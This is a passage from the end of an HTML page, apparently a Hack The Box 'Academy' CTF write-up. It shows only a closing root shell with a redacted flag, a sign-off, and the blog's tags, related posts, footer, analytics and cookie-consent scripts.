+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@academy:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@academy:~# <span class="nb">cat </span>root.txt 
+&lt;redacted&gt;
+root@academy:~#
+</code></pre></div></div>
+
+<p>I hope you have enjoyed this box resolution!</p>
+
+<p>See you next time! <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/en-US/tag/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/en-US/tag/#htb-easy" class="page__taxonomy-item" rel="tag">htb-easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/en-US/tag/#htb-linux" class="page__taxonomy-item" rel="tag">htb-linux</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/en-US/categories/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-02-27T13:00:00-03:00">February 27, 2021</time></p>
+
+
+      </footer>
+
+      <section id="sharelinks" class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Hackthebox+write-up%3A+Academy%20https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F02%2Fhtb-academy%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F02%2Fhtb-academy%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F02%2Fhtb-academy%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F02%2Fhtb-academy%2F" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F02%2Fhtb-academy%2F&amp;text=Hackthebox+write-up%3A+Academy" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+    
+      <a href="/en-US/writeup/2021/02/htb-doctor/" class="pagination--pager" title="Hackthebox write-up: Doctor
+">Previous</a>
+    
+    
+    
+      
+        <a href="/en-US/azure-arc/2021/03/azure-arc-enabled-servers-service-level-proxy-configuration-on-linux/" class="pagination--pager" title="Azure Arc enabled Servers: Service-level proxy configuration on Linux
+">Next</a>
+        
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Leave a comment</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/BmkB4rb.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+      
+      
+      <a href="https://davicruz.com/en-US/writeup/2021/06/htb-tenet/" rel="permalink">Hackthebox write-up: Tenet
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-12T13:00:00-03:00">June 12, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          7 minute read
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        <span class="page__meta-lang"><a href="/writeup/2021/02/htb-academy/">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Share</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Tenet, another medium-rated Linux box from Hack The Box, created by egotisticalSW.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/wHnMfBz.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+      
+      
+      <a href="https://davicruz.com/en-US/writeup/2021/06/htb-scriptkiddie/" rel="permalink">Hackthebox write-up: ScriptKiddie
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-05T13:00:00-03:00">June 5, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        <span class="page__meta-lang"><a href="/writeup/2021/02/htb-academy/">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Share</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be ScriptKiddie, another easy-rated Linux box from Hack The Box, created by 0xdf.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/FTjLM76.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+      
+      
+      <a href="https://davicruz.com/en-US/writeup/2021/05/htb-delivery/" rel="permalink">Hackthebox write-up: Delivery
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-22T13:00:00-03:00">May 22, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        <span class="page__meta-lang"><a href="/writeup/2021/02/htb-academy/">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Share</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Delivery, another easy-rated machine from Hack The Box, created by ippsec.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/R2EVM1J.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+      
+      
+      <a href="https://davicruz.com/en-US/writeup/2021/05/htb-ready/" rel="permalink">Hackthebox write-up: Ready
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-15T13:00:00-03:00">May 15, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        <span class="page__meta-lang"><a href="/writeup/2021/02/htb-academy/">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Share</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Ready, another median-rated machine from Hack The Box, created by bertolis.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Osano - consent -->
+<script src="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.js" data-cfasync="false"></script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+
+    
+    <li><strong>Follow:</strong></li>
+    
+
+    
+    
+    
+    <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+    
+    
+    
+    <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+    
+    
+    
+    <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    
+    
+    
+    <!-- Terms and Privacy -->
+    <li><a href="https://davicruz.com/en-US/terms-and-privacy/" rel="nofollow noopener noreferrer">
+        <i class="fas fa-user-shield" aria-hidden="true"></i> Terms of Service and Privacy Policy</a></li>
+    <!-- end Terms and Privacy -->
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<!-- Start Read in other languages-->
+<div class="page__footer-follow">
+  <ul>
+    
+    
+    
+    <li><a href="https://davicruz.com">Disponível também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></li>
+    
+
+    
+
+    
+
+      
+      
+    
+      
+  </ul>
+</div>
+<!-- End Read in other languages-->
+
+<div class="page__footer-copyright">© 2021 Davi Cruz. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-54883666-1"></script>
+<script>
+  function EnableGTAGonConsent(){
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-54883666-1', { 'anonymize_ip': true});
+  }
+</script>
+
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+  function EnableMSClarityonConsent(){
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "5dnbfjo108");
+  }
+</script>
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz.github.io');
+    script.setAttribute('issue-term', 'htb-academy');
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+    
+<!-- Cookie Consent Management -->
+<script>
+    var strMessage = "This website uses cookies to ensure you get the best experience";
+    var strDismiss = "Got it!";
+    var strAllow = "Allow cookies";
+    var strDeny = "No, thanks!";
+    var strLink = "Learn More";
+    var strHref = "https://davicruz.com/en-US/terms-and-privacy/";
+
+    window.cookieconsent.initialise({
+        "palette": {
+            "popup": {
+                "background": "#252e39"
+            },
+            "button": {
+                "background": "transparent",
+                "text": "#008288",
+                "border": "#008288"
+            }
+        },
+        "position": "bottom-left",
+        "type": "opt-in",
+        "content": {
+            "message": strMessage,
+            "dismiss": strDismiss,
+            "allow": strAllow,
+            "deny": strDeny,
+            "link": strLink,
+            "href": strHref
+        },
+        onInitialise: function (status) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onStatusChange: function (status, chosenBefore) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onRevokeChoice: function () {
+            var type = this.options.type;
+            if (type == 'opt-in') {
+                // disable cookies
+            }
+            if (type == 'opt-out') {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+        }
+    });
+</script>
+<!-- End of Cookie Consent Management -->
+
+  </body>
+</html>
